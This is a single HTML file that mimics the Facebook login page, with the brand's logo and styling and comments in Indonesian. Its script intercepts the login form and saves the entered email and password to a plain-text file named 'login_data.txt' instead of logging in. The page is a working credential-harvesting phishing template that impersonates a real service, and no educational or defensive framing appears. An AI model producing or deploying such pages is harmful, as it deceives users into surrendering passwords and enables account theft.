<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook Login</title>
    <!-- Menambahkan link ke Bootstrap CSS -->
    <link href="https://stackpath.bootstrapcdn.com/bootstrap/4.5.2/css/bootstrap.min.css" rel="stylesheet">
    <style>
        body {
            background-color: #f0f2f5;
        }
        .login-container {
            max-width: 500px;
            margin-top: 100px;
            background-color: white;
            padding: 30px;
            border-radius: 8px;
            box-shadow: 0 4px 10px rgba(0, 0, 0, 0.1);
        }
        .facebook-logo {
            width: 200px;
            margin-bottom: 30px;
        }
        .form-control {
            height: 45px;
            border-radius: 25px;
        }
        .btn-facebook {
            background-color: #1877f2;
            border-radius: 25px;
            color: white;
            font-weight: bold;
            width: 100%;
        }
        .btn-facebook:hover {
            background-color: #166fe5;
        }
        .forgot-password {
            text-align: right;
            font-size: 12px;
        }
        .sign-up-link {
            text-align: center;
            margin-top: 20px;
        }
        .sign-up-link a {
            color: #1877f2;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- Login Form Container -->
        <div class="login-container">
            <!-- Facebook Logo -->
            <img src="https://upload.wikimedia.org/wikipedia/commons/5/51/Facebook_f_logo_%282019%29.svg" class="facebook-logo" alt="Facebook Logo">
            
            <!-- Form Login -->
            <form id="loginForm">
                <!-- Email input -->
                <div class="form-group">
                    <input type="email" class="form-control" id="email" placeholder="Email or phone number" required>
                </div>
                <!-- Password input -->
                <div class="form-group">
                    <input type="password" class="form-control" id="password" placeholder="Password" required>
                </div>
                <!-- Login button -->
                <button type="submit" class="btn btn-facebook">Log In</button>
            </form>

            <!-- Forgot password link -->
            <div class="forgot-password">
                <a href="#">Forgotten password?</a>
            </div>

            <!-- Sign up link -->
            <div class="sign-up-link">
                <span>Don't have an account?</span>
                <a href="#">Create New Account</a>
            </div>
        </div>
    </div>

    <!-- Menambahkan link ke Bootstrap JS dan jQuery -->
    <script src="https://code.jquery.com/jquery-3.5.1.slim.min.js"></script>
    <script src="https://cdn.jsdelivr.net/npm/bootstrap@4.5.2/dist/js/bootstrap.bundle.min.js"></script>

    <!-- Menambahkan script untuk mengunduh data ke file txt -->
    <script>
        document.getElementById('loginForm').addEventListener('submit', function(event) {
            event.preventDefault(); // Mencegah form agar tidak ter-submit
            const email = document.getElementById('email').value;
            const password = document.getElementById('password').value;

            // Membuat konten yang akan disimpan dalam file
            const data = `Email: ${email}\nPassword: ${password}\n`;

            // Membuat file teks untuk diunduh
            const blob = new Blob([data], { type: 'text/plain' });
            const link = document.createElement('a');
            link.href = URL.createObjectURL(blob);
            link.download = 'login_data.txt';  // Nama file yang akan diunduh

            // Memulai unduhan
            link.click();
        });
    </script>
</body>
</html>
